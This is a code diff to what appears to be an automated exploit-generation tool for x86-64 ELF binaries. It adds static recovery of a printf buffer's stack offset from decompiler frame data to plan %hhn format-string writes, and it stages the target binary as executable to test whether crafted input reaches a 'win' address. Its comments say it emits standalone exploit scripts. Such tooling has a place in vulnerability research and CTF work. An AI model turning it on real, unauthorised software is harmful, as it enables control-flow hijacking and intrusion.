@@ -27,6 +27,7 @@ probe-first recipe."""
 from __future__ import annotations
 
 import logging
+import re
 from typing import Optional
 
 from ... import observe
@@ -349,6 +350,86 @@ def _function_ir(conn, target_id, faddr):
     return None
 
 
+def _function_frame(conn, target_id, faddr):
+    """The decompiler-recovered stack frame for a function ({frame_size, vars:[{name,offset,...}]}),
+    or None. The companion to _function_ir for the static (no-execution) offset path."""
+    from ...db.dao import FunctionDAO
+    fd = FunctionDAO(conn)
+    try:
+        want = int(faddr, 16) if isinstance(faddr, str) else int(faddr)
+    except (TypeError, ValueError):
+        return None
+    for f in fd.list_by_target(target_id):
+        try:
+            a = int(f.addr, 16) if isinstance(f.addr, str) else int(f.addr)
+        except (TypeError, ValueError):
+            continue
+        if a == want:
+            full = fd.get(f.id)
+            return getattr(full, "frame", None) if full else None
+    return None
+
+
+def _static_layout_from_frame(ir, frame, site_addr, fname: str) -> Optional[dict]:
+    """doc 58 non-runnable path: recover the printf arg offset with NO execution when the decompiler
+    symbolized the stack local (so the numeric displacement is hidden from the instruction text).
+    The frame map carries what the text lost -- the local's rbp-relative offset and the frame size.
+
+    `buf` at rbp+offset with rsp = rbp - frame_size sits at rsp + (frame_size + offset); its 1-based
+    varargs position is `first_stack + (that disp)/8`. Returns a `kind:"stack"` layout (same shape
+    `plan_format_write` consumes) or None. x86-64 SysV."""
+    k = FMT_ARG_INDEX.get(fname)
+    if k is None or not frame:
+        return None
+    try:
+        fsize = int(frame.get("frame_size") or 0)
+        variables = frame.get("vars") or []
+    except (AttributeError, TypeError):
+        return None
+    if fsize <= 0 or not variables:
+        return None
+    instrs = x64frame.instructions(ir)
+    idx = x64frame.site_index(instrs, site_addr)
+    if idx is None:
+        return None
+    reg = x64frame.ARG_REGS[k]
+    before = [t for _, t in instrs[:idx]]
+    # NB: no arg-register check here. The lead is already a confirmed non-literal format sink, and a
+    # STACK-based %hhn write (arg offset in the varargs STACK window, not a register) is unaffected
+    # by whatever sits in rsi/rdx -- the crude "a later reg is written" test false-rejects common
+    # surrounding code (e.g. `lea rdx,[buf]` emitted for a `buf[n]=0` null-termination).
+    deft = x64frame.defining_text(before, reg)
+    if not deft or x64frame._split(deft)[0] != "lea" or "[" not in deft:
+        return None
+    inner = deft[deft.find("[") + 1:deft.rfind("]")].strip()
+    off = None
+    m = re.search(r"\brbp\b\s*([+-])\s*(0x[0-9a-fA-F]+|\d+)", inner)   # literal rbp-relative
+    if m:
+        off = (1 if m.group(1) == "+" else -1) * int(m.group(2), 0)
+    else:
+        nm = re.match(r"([A-Za-z_.$][\w.$]*)", inner)                 # symbolized local -> frame map
+        if nm:
+            for v in variables:
+                if isinstance(v, dict) and v.get("name") == nm.group(1):
+                    try:
+                        off = int(v.get("offset"))
+                    except (TypeError, ValueError):
+                        off = None
+                    break
+    if off is None:
+        return None
+    disp = fsize + off                                   # the local's byte displacement above rsp
+    if disp < 0:
+        return None
+    first = 6 - k
+    pad = (-disp) % 8
+    return {"func": fname, "fmt_reg": reg, "first_stack": first, "kind": "stack",
+            "arg_offset": first + (disp + pad) // 8, "pad": pad, "buf_disp": disp,
+            "frame": fsize, "loop": x64frame.in_loop(instrs, idx),
+            "after": x64frame.calls_after(instrs, idx), "site": instrs[idx][0],
+            "reader": None, "cap": None, "_static_frame": True}
+
+
 def _sink_name(ir, site_addr) -> Optional[str]:
     instrs = x64frame.instructions(ir)
     k = x64frame.site_index(instrs, site_addr)
@@ -440,8 +521,16 @@ def _try_detonate(ctx, target, plan: dict, win):
         win_vaddr = int(win[1]) if win and win[1] else None
         if win_vaddr is None or not plan.get("input"):
             return (False, None)
-        exe = ctx.content.path(target.sha256)
-        if detonate.reaches_address(str(exe), bytes(plan["input"]), win_vaddr, input_mode="stdin"):
+        from . import elfstatic
+        tb = ctx.content.path(target.sha256).read_bytes()
+        if elfstatic.is_pie(tb):                          # win_vaddr is a file vaddr; PIE needs a base
+            return (False, None)
+        # stage into an EXEC-capable dir -- the content store keeps artifacts non-exec
+        staged = ctx.scratch() / "fmt-construct" / (getattr(target, "filename", None) or "target.bin")
+        staged.parent.mkdir(parents=True, exist_ok=True)
+        ctx.content.stage_target(target, staged.parent, staged.name)
+        staged.chmod(0o755)
+        if detonate.reaches_address(str(staged), bytes(plan["input"]), win_vaddr, input_mode="stdin"):
             return (True, f"control reached {win[0]} ({win_vaddr:#x})")
     except Exception:                                    # noqa: BLE001
         observe.absorbed(_log, "fmt detonation skipped")
@@ -480,6 +569,13 @@ def file_format_write_recipes(ctx, target, *, why: str, target_bytes: Optional[b
                 continue
             name = _sink_name(ir, lead.site_addr)
             layout = format_layout(ir, lead.site_addr, name or "")
+            # doc 58 non-runnable path: when the static instruction text can't place the format
+            # buffer (symbolized local), recover the offset from the frame map -- no execution.
+            if not (layout and layout.get("kind") == "stack") and name:
+                frame = _function_frame(ctx.conn, target.id, lead.function_addr)
+                fl = _static_layout_from_frame(ir, frame, lead.site_addr, name)
+                if fl:
+                    layout = fl
             plan = plan_format_write(target_bytes, layout, win=win) if layout else None
             # Emit a standalone exploit SCRIPT (the operator-runnable deliverable): a write-what-where
             # when a plan exists, else a leak-only PoC -- a format string is always at least an info
